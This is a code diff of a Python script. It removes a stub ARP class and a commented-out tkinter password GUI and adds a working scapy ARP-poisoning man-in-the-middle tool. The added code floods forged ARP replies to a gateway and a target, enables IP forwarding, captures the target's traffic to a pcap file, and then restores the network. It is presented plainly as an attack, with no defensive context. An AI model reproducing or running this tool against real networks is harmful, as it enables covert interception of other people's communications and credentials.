@@ -1,106 +1,68 @@
 from scapy.all import *
-from scapy.layers.l2 import *
+import os
+import signal
+import sys
+import threading
+import time
 
-# IP_REDIR:  The 'fake' IP Address of the spoofed domain
-# IP_REAL:      The actual IP Address of the spoofed domain
-# IP_VICTIM:    The IP Address of the victim
-# IP_VM:        The IP Address of the virtual machine
-# DOMAIN:       The domain to be spoofed
+class ARPattack:
+    def __init__(self, gateway_ip, gateway_mac, target_ip, target_mac, frequency, packet_count):
+        #ARP Poison parameters
+        self.gateway_ip = gateway_ip        #gateway_ip = "192.168.56.1"
+        self.gateway_mac = gateway_mac
+        self.target_ip = target_ip          #target_ip = "192.168.56.101"
+        self.target_mac = target_mac
+        self.frequency = frequency
+        self.packet_count = packet_count    #packet_count = 1000
 
+    def start_attack(gateway_ip, gateway_mac, target_ip, target_mac, frequency, pkt_cnt):
+        #Start the script
+        conf.iface = "enp0s3"
+        conf.verb = 0
+        print("[*] Starting script: arp_poison.py")
+        print("[*] Enabling IP forwarding")
+        #Enable IP Forwarding on a mac
+        os.system("sysctl -w net.inet.ip.forwarding=1")
+        print("[*] Gateway IP address: %s" %gateway_ip)
+        print("[*] Target IP address: %s" %target_ip)
 
-class ARP:
-    def __init__(self, src, dst, hwsrc, psrc, hwdst, pdst):
-        self.src = src
-        self.dst = dst
-        self.hwsrc = hwsrc
-        self.psrc = psrc
-        self.hwdst = hwdst
-        self.pdst = pdst
+        #ARP poison thread
+        poison_thread = threading.Thread(target=ARPattack.arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, frequency))
+        poison_thread.start()
 
-    @staticmethod
-    def spoof(src, dst, hwsrc, psrc, hwdst, pdst):
-        print("sicko mate gj")
-        print("easy peasy")
+        #Sniff traffic and write to file. Capture is filtered on target machine
+        try:
+            sniff_filter = "ip host " + target_ip
+            print("[*] Starting network capture. Packet Count: %d. Filter: %s" %(pkt_cnt ,sniff_filter))
+            packets = sniff(filter=sniff_filter, iface=conf.iface, count=pkt_cnt)
+            wrpcap(target_ip + "_capture.pcap", packets)
+            print("[*] Stopping network capture..Restoring network")
+            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+        except KeyboardInterrupt:
+            print("[*] Stopping network capture..Restoring network")
+            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+            sys.exit(0)
 
-"""
-from tkinter import *
+    #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
+    #correct MAC and IP Address information
+    def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+        print("[*] Disabling IP forwarding")
+        #Disable IP Forwarding on a mac
+        os.system("sysctl -w net.inet.ip.forwarding=0")
+        #kill process on a mac
+        os.kill(os.getpid(), signal.SIGTERM)
 
-
-class Application(Frame):
-
-
-    def __init__(self, master):
-
-        Frame.__init__(self, master)
-        self.grid()
-        self.button_clicks = 0
-        self.create_widgets()
-
-    def create_widgets(self):
-
-        # Create a label
-        self.instruction = Label(self)
-        self.instruction["text"] = "Enter your IP Address"
-        self.instruction.grid(row=0, column=0, columnspan=2, sticky=W)
-
-        # Create an entry
-        self.pswd = Entry(self)
-        self.pswd.grid(row=1, column=1, sticky=W)
-
-        # Create a submit button
-        self.submit_button = Button(self)
-        self.submit_button["text"] = "Submit"
-        self.submit_button["command"] = self.reveal
-        self.submit_button.grid(row=2, column=0, sticky=W)
-
-        # Create text
-        self.text = Text(self, state=DISABLED, width=35, height=5, wrap=WORD)
-        self.text.grid(row=3, column=0, columnspan=2, sticky=W)
-
-        # Create a counter button
-        self.button = Button(self)
-        self.button["text"] = "Total clicks: 0"
-        self.button["command"] = self.update_counter
-        self.button.grid()
-
-        # Create a button that goes to another GUI
-        self.newtab = Button(self)
-        self.newtab["text"] = "Go to another page"
-        self.newtab["command"] = self.goto_new_window
-        self.newtab.grid()
-
-    def update_counter(self):
-
-        self.button_clicks += 1
-        self.button["text"] = "Total clicks: " + str(self.button_clicks)
-
-    def reveal(self):
-
-        content = self.pswd.get()
-
-        if (content == "password"):
-            message = "Good job fam"
-
-        else:
-            message = "Access denied"
-        self.text["state"] = NORMAL
-        self.text.delete(0.0, END)
-        self.text.insert(0.0, message)
-        self.text["state"] = DISABLED
-
-    def goto_new_window(self):
-        newpage.mainloop()
-
-
-root = Tk()
-root.title("Three buttons")
-root.geometry("300x300")
-
-newpage = Tk()
-newpage.title("New page")
-newpage.geometry("300x300")
-
-app = Application(root)
-
-root.mainloop()
-"""
+    #Keep sending false ARP replies to put our machine in the middle to intercept packets
+    #This will use our interface MAC address as the hwsrc for the ARP reply
+    def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, frequency):
+        print("[*] Started ARP poison attack [CTRL-C to stop]")
+        try:
+            while True:
+                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
+                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
+                time.sleep(frequency)
+        except KeyboardInterrupt:
+            print("[*] Stopped ARP poison attack. Restoring network")
+            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
